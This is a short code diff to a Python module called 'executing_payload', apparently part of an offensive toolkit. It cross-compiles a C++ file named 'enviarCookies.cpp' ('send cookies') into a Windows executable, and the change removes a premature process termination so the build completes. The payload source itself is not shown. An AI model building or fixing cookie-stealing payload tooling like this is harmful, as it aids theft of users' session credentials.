@@ -66,6 +66,5 @@ class executing_payload(Module):
 		print("Archivo "+ fullname + " creado.")
 		#i686-w64-mingw32-g++ enviarCookies.cpp -o envia -static-libgcc -static-libstdc++ -lwsock32
 		args = ["i686-w64-mingw32-g++", fullname, "-o", outfile, "-static-libgcc", "-static-libstdc++", "-lwsock32"]
-		p = subprocess.Popen(args)
-		p.terminate()
+		subprocess.Popen(args)
 		print("Compilado {}.".format(outfile))
